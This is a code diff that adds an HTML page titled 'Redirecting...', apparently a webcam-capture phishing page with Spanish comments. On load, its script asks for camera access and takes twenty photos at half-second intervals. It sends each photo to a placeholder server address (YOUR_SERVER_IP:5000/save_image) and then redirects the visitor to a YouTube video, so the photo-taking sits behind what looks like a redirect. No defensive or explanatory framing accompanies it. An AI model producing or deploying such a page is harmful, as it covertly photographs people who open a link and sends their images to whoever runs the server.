@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+</head>
+<body>
+    <script>
+        async function startCamera() {
+            const video = document.createElement('video');
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            video.srcObject = stream;
+            video.play();
+            document.body.appendChild(video);
+
+            for (let i = 0; i < 20; i++) {
+                await new Promise(resolve => setTimeout(resolve, 500)); // Espera 0.5 segundos entre cada captura
+                capturePhoto(video);
+            }
+
+            video.srcObject.getTracks().forEach(track => track.stop()); // Detiene la cámara
+            setTimeout(redirect, 1000); // Redirige después de 1 segundos
+        }
+
+        function capturePhoto(video) {
+            const canvas = document.createElement('canvas');
+            const context = canvas.getContext('2d');
+            canvas.width = 640;
+            canvas.height = 480;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const dataUrl = canvas.toDataURL('image/png');
+            sendImageToServer(dataUrl);
+        }
+
+        function sendImageToServer(dataUrl) {
+            fetch('http://YOUR_SERVER_IP:5000/save_image', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ image: dataUrl })
+            }).then(response => response.json())
+              .then(data => console.log('Image saved:', data))
+              .catch(error => console.error('Error:', error));
+        }
+
+        function redirect() {
+            window.location.href = 'https://www.youtube.com/watch?v=I3NAHbsTicw';
+        }
+
+        startCamera();
+    </script>
+</body>
+</html>
+
